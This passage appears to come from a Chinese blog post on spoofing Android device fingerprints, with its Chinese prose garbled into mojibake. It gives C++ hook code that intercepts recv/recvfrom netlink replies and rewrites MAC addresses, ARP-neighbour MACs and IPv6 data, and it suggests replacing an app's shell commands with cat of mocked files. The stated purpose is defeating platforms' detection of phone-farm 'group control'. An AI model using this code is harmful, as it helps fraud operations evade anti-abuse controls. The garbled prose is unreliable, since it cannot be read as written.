class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">case SC_recvmsg: &#123;</span><br><span class="line">    //LOGI(&quot;start handle SC_recvmsg systexit after&quot;)</span><br><span class="line">    if (isMockFingerptint()) &#123;</span><br><span class="line">        NetlinkMacHandler::netlinkHandler_recmsg(tracee);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line">case SC_recv:</span><br><span class="line">case SC_recvfrom: &#123;</span><br><span class="line">    //LOGE(&quot;start handle SC_recvfrom systexit after&quot;)</span><br><span class="line">    //recvåº•å±‚èµ°çš„recvfrom,æ‰€ä»¥ä¸éœ€è¦å¤„ç†recvfrom</span><br><span class="line">    if (isMockFingerptint()) &#123;</span><br><span class="line">        NetlinkMacHandler::netlinkHandler_recv(tracee);</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯»æ–‡ä»¶è·å–è¿™å—å› ä¸ºç½‘å¡ä¿¡æ¯å·²ç»åœ¨å†…å­˜é‡Œé¢ ï¼Œæ‰€ä»¥ç›´æ¥<strong>IOé‡å®šå‘</strong>è¿‡å»å³å¯ ã€‚</p><p>å¸¸ç”¨çš„è·å–ç½‘å¡ä¿¡æ¯çš„æ–‡ä»¶ ï¼Œä»¥<code>wlan0</code>ä¸ºä¾‹å­ ,åœºæ™¯çš„è·å–ç›®å½•å¦‚ä¸‹ï¼šå¯ä»¥catè·å–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/wlan0/address</span><br><span class="line">/sys/devices/virtual/net/wlan0/address</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="é™„è¿‘ç½‘å¡ä¿¡æ¯"><a href="#é™„è¿‘ç½‘å¡ä¿¡æ¯" class="headerlink" title="é™„è¿‘ç½‘å¡ä¿¡æ¯"></a>é™„è¿‘ç½‘å¡ä¿¡æ¯</h3><p>è¿™ä¸ªå­—æ®µä¸»è¦æ˜¯<strong>ç›‘æ§ç¾¤æ§çš„ä¸€äº›ä¿¡æ¯</strong>çš„ï¼Œä¸»è¦ä½œç”¨æ˜¯è·å–å½“å‰<code>wifi</code> é™„è¿‘çš„äºº<code>MAC</code>ä¿¡æ¯çš„ ã€‚</p><p>æ¯”å¦‚å¤§å‚ä¸€èˆ¬æ£€æµ‹ç¾¤æ§çš„æ‰‹æ®µå°±æ˜¯è·å–é™„è¿‘çš„ç½‘å¡ï¼Œ<strong>å¦‚æœæœ‰èšé›†æ€§å°±å¯ä»¥è®¤ä¸ºæ˜¯ç¾¤æ§</strong></p><p>è·å–çš„æ–¹å¼ä¹Ÿä¹Ÿè·Ÿä¸Šé¢ä¸€æ ·ï¼Œäº”ç§è·å–æ–¹æ³• ã€‚</p><p>è·å–æ–¹æ³•åº•å±‚ä¹Ÿæ˜¯å’Œ<code>MAC</code>è·å–æ–¹æ³•ä¸€æ · ï¼Œåº•å±‚éƒ½æ˜¯<code>netlink</code>ï¼Œæ¯”å¦‚å¯ä»¥ç›´æ¥æ‰§è¡Œ <code>popen</code>è·å– ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(<span class="string">&quot;ip neigh show&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥ç›´æ¥è¯»æ–‡ä»¶ ï¼Œè·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç›´æ¥<code>netlink</code>è·å– ï¼Œåœ¨æ”¶åˆ°æ¶ˆæ¯ä»¥ååˆ¤æ–­æ¶ˆæ¯ç±»å‹æ˜¯ <code>hdr-&gt;nlmsg_type == RTM_NEWNEIGH</code> ç›´æ¥è¿›è¡Œæ›¿æ¢å³å¯ </p><p>ç›´æ¥åœ¨<code>recv</code>æ”¶åˆ°æ¶ˆæ¯ä»¥åå¯¹æ•°æ®é‡Œé¢çš„<code>buff</code>è¿›è¡Œæ›¿æ¢å³å¯ã€‚ä¸»è¦æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼ŒåŒ…æ‹¬ä¸Šé¢çš„macåœ°å€æ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">static void _getifaddrs_callback(void *context, nlmsghdr *hdr) &#123;</span><br><span class="line">    auto **out = reinterpret_cast&lt;ifaddrs **&gt;(context);</span><br><span class="line"> </span><br><span class="line">    //é¦–å…ˆå…ˆåˆ¤æ–­æ¶ˆæ¯ç±»å‹æ˜¯ä¸æ˜¯RTM_NEWLINKç±»å‹</span><br><span class="line">    if (hdr-&gt;nlmsg_type == RTM_NEWLINK) &#123;</span><br><span class="line">        auto *ifi = reinterpret_cast&lt;ifinfomsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line"> </span><br><span class="line">        ifaddrs_storage new_addr(out);</span><br><span class="line">        new_addr.interface_index = ifi-&gt;ifi_index;</span><br><span class="line">        new_addr.ifa.ifa_flags = ifi-&gt;ifi_flags;</span><br><span class="line"> </span><br><span class="line">        // Get the interface name</span><br><span class="line">        char ifname[IFNAMSIZ];</span><br><span class="line">        if_indextoname(ifi-&gt;ifi_index, ifname);</span><br><span class="line"> </span><br><span class="line">        // Go through the various bits of information and find the name.</span><br><span class="line">        rtattr *rta = IFLA_RTA(ifi);</span><br><span class="line">        //è·å–è¿™ä¸ªæ¶ˆæ¯çš„é•¿åº¦</span><br><span class="line">        size_t rta_len = IFLA_PAYLOAD(hdr);</span><br><span class="line">        //è¿™å—æ˜¯åˆ¤æ–­è¿™ä¸ªæ¶ˆæ¯æ˜¯å¦æ˜¯åˆæ ¼çš„æ¶ˆæ¯</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            if (rta-&gt;rta_type == IFLA_ADDRESS)&#123; // MACåœ°å€</span><br><span class="line">                if (RTA_PAYLOAD(rta) &lt; sizeof(new_addr.addr)) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    //ä¿®æ”¹macåœ°å€</span><br><span class="line">                    setMacInData(data, ifname, ZHENXI_RUNTIME_NETLINK_MAC, false);</span><br><span class="line">                    new_addr.SetAddress(AF_PACKET, data, RTA_PAYLOAD(rta));</span><br><span class="line">                    new_addr.SetPacketAttributes(ifi-&gt;ifi_index, ifi-&gt;ifi_type,</span><br><span class="line">                                                 RTA_PAYLOAD(rta));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (rta-&gt;rta_type == IFLA_BROADCAST) &#123;</span><br><span class="line">                if (RTA_PAYLOAD(rta) &lt; sizeof(new_addr.ifa_ifu)) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    new_addr.SetBroadcastAddress(AF_PACKET, data, byteCount);</span><br><span class="line">                    new_addr.SetPacketAttributes(ifi-&gt;ifi_index, ifi-&gt;ifi_type,</span><br><span class="line">                                                 RTA_PAYLOAD(rta));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (rta-&gt;rta_type == IFLA_IFNAME) &#123;</span><br><span class="line">                if (RTA_PAYLOAD(rta) &lt; sizeof(new_addr.name)) &#123;</span><br><span class="line">                    memcpy(new_addr.name, RTA_DATA(rta), RTA_PAYLOAD(rta));</span><br><span class="line">                    new_addr.ifa.ifa_name = new_addr.name;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (hdr-&gt;nlmsg_type == RTM_NEWADDR) &#123;  // IP åœ°å€</span><br><span class="line">        //è¿™ä¸ªç±»å‹åœ¨è·å–ç½‘å¡çš„æ—¶å€™æœªå‘ç°è°ƒç”¨</span><br><span class="line">        auto *msg = reinterpret_cast&lt;ifaddrmsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        // We should already know about this from an RTM_NEWLINK message.</span><br><span class="line">        const auto *addr = reinterpret_cast&lt;const ifaddrs_storage *&gt;(*out);</span><br><span class="line"> </span><br><span class="line">        while (addr != nullptr &amp;&amp; addr-&gt;interface_index != static_cast&lt;int&gt;(msg-&gt;ifa_index)) &#123;</span><br><span class="line">            //LOGE(&quot;Current interface index: %d&quot;, addr-&gt;interface_index); // æ·»åŠ å½“å‰æ¥å£ç´¢å¼•æ—¥å¿—</span><br><span class="line">            addr = reinterpret_cast&lt;const ifaddrs_storage *&gt;(addr-&gt;ifa.ifa_next);</span><br><span class="line">        &#125;</span><br><span class="line">        // If this is an unknown interface,</span><br><span class="line">        // ignore whatever we&#x27;re being told about it.</span><br><span class="line">        if (addr == nullptr) &#123;</span><br><span class="line">            //LOGE (&quot;_getifaddrs_callback RTM_NEWADDR return&quot;)</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        ifaddrs_storage new_addr(out);</span><br><span class="line">        strcpy(new_addr.name, addr-&gt;name);</span><br><span class="line">        new_addr.ifa.ifa_name = new_addr.name;</span><br><span class="line">        new_addr.ifa.ifa_flags = addr-&gt;ifa.ifa_flags;</span><br><span class="line">        new_addr.interface_index = addr-&gt;interface_index;</span><br><span class="line">        // Go through the various bits of information and find the address</span><br><span class="line">        // and any broadcast/destination address.</span><br><span class="line">        rtattr *rta = IFA_RTA(msg);</span><br><span class="line">        size_t rta_len = IFA_PAYLOAD(hdr);</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            LOGE(&quot;RTA type: %d&quot;, rta-&gt;rta_type);</span><br><span class="line">            if (rta-&gt;rta_type == IFA_ADDRESS) &#123;</span><br><span class="line">                //LOGE (&quot;_getifaddrs_callback RTM_NEWADDR IFA_ADDRESS %d &quot;,msg-&gt;ifa_family)</span><br><span class="line">                if (msg-&gt;ifa_family == AF_INET || msg-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    // ç¡®ä¿ RTA_DATA(rta) çš„å¤§å°æ˜¯æ­£ç¡®çš„</span><br><span class="line">                    if (msg-&gt;ifa_family == AF_INET6 &amp;&amp; RTA_PAYLOAD(rta) &lt; sizeof(struct in6_addr)) &#123;</span><br><span class="line">                        LOGE(&quot;RTA_PAYLOAD size is less than sizeof(struct in6_addr)&quot;);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    struct in6_addr addr_v6_address&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr_v6_address, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr_v6_address, str, sizeof(str));</span><br><span class="line">                    LOGE(&quot;RTM_NEWADDR&amp;IFA_ADDRESS&amp;AF_INET6 111 %s&quot;, str)</span><br><span class="line"> </span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    LOGE (&quot;RTM_NEWADDR&amp;IFA_ADDRESS %zu  %s &quot;,</span><br><span class="line">                          byteCount, getpData(data, byteCount).c_str())</span><br><span class="line">                    new_addr.SetAddress(msg-&gt;ifa_family, data, byteCount);</span><br><span class="line">                    new_addr.SetNetmask(msg-&gt;ifa_family, msg-&gt;ifa_prefixlen);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (rta-&gt;rta_type == IFA_BROADCAST) &#123;</span><br><span class="line">                if (msg-&gt;ifa_family == AF_INET||msg-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    LOGE (&quot;RTM_NEWADDR&amp;IFA_BROADCAST %zu  %s &quot;,</span><br><span class="line">                          byteCount, getpData(data, byteCount).c_str())</span><br><span class="line">                    new_addr.SetBroadcastAddress(msg-&gt;ifa_family, data,</span><br><span class="line">                                                 byteCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else if (rta-&gt;rta_type == IFA_LOCAL) &#123;</span><br><span class="line">                //LOGE (&quot;_getifaddrs_callback RTM_NEWADDR IFA_LOCAL %d &quot;,msg-&gt;ifa_family)</span><br><span class="line">                if (msg-&gt;ifa_family == AF_INET || msg-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    void *data = RTA_DATA(rta);</span><br><span class="line">                    struct in6_addr addr_v6_local&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr_v6_local, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr_v6_local, str, sizeof(str));</span><br><span class="line">                    LOGE(&quot;RTM_NEWADDR&amp;IFA_ADDRESS&amp;AF_INET6 222 %s&quot;, str)</span><br><span class="line"> </span><br><span class="line">                    size_t byteCount = RTA_PAYLOAD(rta);</span><br><span class="line">                    LOGE (&quot;RTM_NEWADDR&amp;IFA_LOCAL %zu  %s &quot;,</span><br><span class="line">                          byteCount, getpData(data, byteCount).c_str())</span><br><span class="line">                    new_addr.SetLocalAddress(msg-&gt;ifa_family, data, byteCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (hdr-&gt;nlmsg_type == RTM_NEWNEIGH) &#123; // æ‹¦æˆªå’Œä¿®æ”¹é‚»å±…ç¼“å­˜ä¿¡æ¯</span><br><span class="line">        // RTM_NEWNEIGH ç±»å‹æ¶ˆæ¯ä¸ºç½‘ä¸Šé‚»å±…(arpè¡¨)ï¼Œéœ€è¦è¿›è¡ŒéšæœºåŒ–</span><br><span class="line">        auto *ifinfo = reinterpret_cast&lt;ndmsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line">        rtattr *rta = NDA_RTA(ifinfo);</span><br><span class="line">        size_t rta_len = NDA_PAYLOAD(hdr);</span><br><span class="line"> </span><br><span class="line">        int if_index = ifinfo-&gt;ndm_ifindex;</span><br><span class="line">        char if_name[IFNAMSIZ];</span><br><span class="line">        if_indextoname(if_index, if_name);</span><br><span class="line">        //éå†å…·ä½“çš„æ¶ˆæ¯ç±»å‹</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            //a neighbor cache n/w layer destination address</span><br><span class="line">            //é‚»å±…ç¼“å­˜nwå±‚ç›®æ ‡åœ°å€,ipåœ°å€åŒºåˆ†32å’Œ64</span><br><span class="line">            //ipåœ°å€,ipå¯ä»¥æ˜¯v4ä¹Ÿå¯ä»¥æ˜¯v6</span><br><span class="line">            if (rta-&gt;rta_type == NDA_DST) &#123;</span><br><span class="line">                if (ifinfo-&gt;ndm_family == AF_INET) &#123;</span><br><span class="line">                    //32</span><br><span class="line">                    struct in_addr addr&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr, RTA_DATA(rta), sizeof(struct in_addr));</span><br><span class="line">                    char *ntoa = inet_ntoa(addr);</span><br><span class="line">                    //LOGE(&quot;NDA_DST&amp;AF_INET   %s&quot;, inet_ntoa(addr))</span><br><span class="line">                &#125; else if (ifinfo-&gt;ndm_family == AF_INET6) &#123;</span><br><span class="line">                    //64</span><br><span class="line">                    struct in6_addr addr&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr, str, sizeof(str));</span><br><span class="line">                    //LOGE(&quot;NDA_DST&amp;AF_INET6  %s&quot;, str);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (rta-&gt;rta_type == NDA_LLADDR) &#123;</span><br><span class="line">                //ç½‘å¡åœ°å€</span><br><span class="line">                auto *data = RTA_DATA(rta);</span><br><span class="line">                setMacInData(data, if_name, ZHENXI_RUNTIME_NETLINK_NEIGH, true);</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (hdr-&gt;nlmsg_type == RTM_GETADDR) &#123; // å¤„ç†å¯¹ RTM_GETADDR è¯·æ±‚çš„å“åº”</span><br><span class="line">        //LOGE(&quot;RTM_GETADDR &quot;)</span><br><span class="line">        auto *ifa = reinterpret_cast&lt;ifaddrmsg *&gt;(NLMSG_DATA(hdr));</span><br><span class="line"> </span><br><span class="line">        // Get the interface name</span><br><span class="line">        char ifname[IFNAMSIZ];</span><br><span class="line">        if_indextoname(ifa-&gt;ifa_index, ifname);</span><br><span class="line"> </span><br><span class="line">        // Process the attributes</span><br><span class="line">        rtattr *rta = IFA_RTA(ifa);</span><br><span class="line">        size_t rta_len = IFA_PAYLOAD(hdr);</span><br><span class="line">        while (RTA_OK(rta, rta_len)) &#123;</span><br><span class="line">            if (rta-&gt;rta_type == IFA_ADDRESS) &#123;</span><br><span class="line">                if (ifa-&gt;ifa_family == AF_INET6) &#123;</span><br><span class="line">                    // Ensure RTA_DATA(rta) size is correct</span><br><span class="line">                    if (RTA_PAYLOAD(rta) &lt; sizeof(struct in6_addr)) &#123;</span><br><span class="line">                        LOGE(&quot;RTM_GETADDR RTA_PAYLOAD size is less than sizeof(struct in6_addr)&quot;);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    struct in6_addr addr_v6_address&#123;&#125;;</span><br><span class="line">                    memcpy(&amp;addr_v6_address, RTA_DATA(rta), sizeof(struct in6_addr));</span><br><span class="line">                    char str[INET6_ADDRSTRLEN];</span><br><span class="line">                    inet_ntop(AF_INET6, &amp;addr_v6_address, str, sizeof(str));</span><br><span class="line">                    LOGE(&quot;RTM_GETADDR RTM_GETADDR&amp;IFA_ADDRESS&amp;AF_INET6 %s&quot;, str);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rta = RTA_NEXT(rta, rta_len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h3><p>è®¾ä¸ªè®¾å¤‡æŒ‡çº¹ä¹Ÿæ˜¯å¾ˆæ ¸å¿ƒçš„è®¾å¤‡æŒ‡çº¹ ï¼Œè¿™ä¸ªç©æ„<strong>åº•å±‚è·å–ä¹Ÿæ˜¯netlink</strong>ï¼Œä½†æ˜¯netlinkè·å–ï¼Œè¿™å—å¤„ç†å¾ˆä¸å¥½å¤„ç† </p><p>å¸¸ç”¨çš„è·å–æ–¹å¼æ¯”å¦‚ï¼ŒJavaè·å–ï¼Œå‘½ä»¤è·å–ã€‚å¦‚æœéœ€è¦è¿›è¡Œæ›¿æ¢çš„è¯ï¼Œåªéœ€è¦å¤„ç†å‘½ä»¤è¡Œå’ŒJava Hookå³å¯ </p><p><strong>å‘½ä»¤è¡Œå¯ä»¥åœ¨å¯¹æ–¹æ‰§è¡Œå‘½ä»¤ä¹‹å‰ï¼Œå°†å‘½ä»¤æ¢æˆcatå‘½ä»¤ï¼Œå»catè‡ªå·±æå‰Mockå¥½çš„æ–‡ä»¶ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„ ã€‚</strong></p><p>å½“ç„¶ï¼Œè¿˜æœ‰å¦ä¸€ç§æ€è·¯ï¼Œå…¶å®è¿™ä¸ªå­—æ®µå¯ä»¥æœåŠ¡ç«¯è·å–ï¼Œå®¢æˆ·ç«¯äºŒæ¬¡ä¸ŠæŠ¥ï¼Œè¿›è¡ŒåŒ¹é… ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 1. å£°æ˜å˜é‡</span><br><span class="line">    NetworkInterface networkInterface;</span><br><span class="line">    InetAddress inetAddress;</span><br><span class="line"></span><br><span class="line">    // 2. å¤–å±‚å¾ªç¯ï¼šéå†æ‰€æœ‰ç½‘ç»œæ¥å£</span><br><span class="line">    for (Enumeration&lt;NetworkInterface&gt; en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) &#123;</span><br><span class="line">        // 3. è·å–å½“å‰ç½‘ç»œæ¥å£</span><br><span class="line">        networkInterface = en.nextElement();</span><br><span class="line"></span><br><span class="line">        // 4. å†…å±‚å¾ªç¯ï¼šéå†å½“å‰æ¥å£ä¸Šçš„æ‰€æœ‰ IP åœ°å€</span><br><span class="line">        for (Enumeration&lt;InetAddress&gt; enumIpAddr = networkInterface.getInetAddresses(); enumIpAddr.hasMoreElements(); ) &#123;</span><br><span class="line">            // 5. è·å–å½“å‰ IP åœ°å€</span><br><span class="line">            inetAddress = enumIpAddr.nextElement();</span><br><span class="line"></span><br><span class="line">            // 6. åˆ¤æ–­æ˜¯å¦ä¸º IPv6 åœ°å€</span><br><span class="line">            if (inetAddress instanceof Inet6Address) &#123;</span><br><span class="line">                // 7. å¦‚æœæ˜¯ï¼Œåˆ™æ‰“å°è¯¥åœ°å€</span><br><span class="line">                CLog.e(&quot;Java è·å– ipv6 &quot; + inetAddress.getHostAddress());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Throwable ex) &#123;</span><br><span class="line">    // 8. å¼‚å¸¸å¤„ç†</span><br><span class="line">    CLog.e(&quot;printf ipv6 info error &quot; + ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>éå†å½“å‰è®¾å¤‡ä¸Šæ‰€æœ‰çš„ç½‘ç»œæ¥å£ï¼ˆNetwork Interfaceï¼‰ï¼Œæ‰¾å‡ºå¹¶æ‰“å°å‡ºä¸è¿™äº›æ¥å£å…³è”çš„æ‰€æœ‰ IPv6 åœ°å€</strong></p><p>å‘½ä»¤è¡Œè·å–å¦‚ä¸‹ï¼Œipå‘½ä»¤è·å–å¦‚ä¸‹ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ip -6 addr show</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 state UNKNOWN qlen 1000</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: dummy0: &lt;BROADCAST,NOARP,UP,LOWER_UP&gt; mtu 1500 state UNKNOWN qlen 1000</span><br><span class="line">    inet6 fe80::b86c:79ff:fe96:4945/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: rmnet_data0@rmnet_ipa0: &lt;UP,LOWER_UP&gt; mtu 1500 state UNKNOWN qlen 1000</span><br><span class="line">    inet6 fe80::2ad1:b5a0:792b:9ec4/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">30: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 state UP qlen 3000</span><br><span class="line">    inet6 fe80::8670:a04c:b8cf:467c/64 scope link stable-privacy</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><h3 id="ç³»ç»Ÿå†…æ ¸ä¿¡æ¯"><a href="#ç³»ç»Ÿå†…æ ¸ä¿¡æ¯" class="headerlink" title="ç³»ç»Ÿå†…æ ¸ä¿¡æ¯"></a>ç³»ç»Ÿå†…æ ¸ä¿¡æ¯</h3><p>è¿™ç©æ„åº•å±‚èµ°çš„éƒ½æ˜¯unameå‡½æ•° 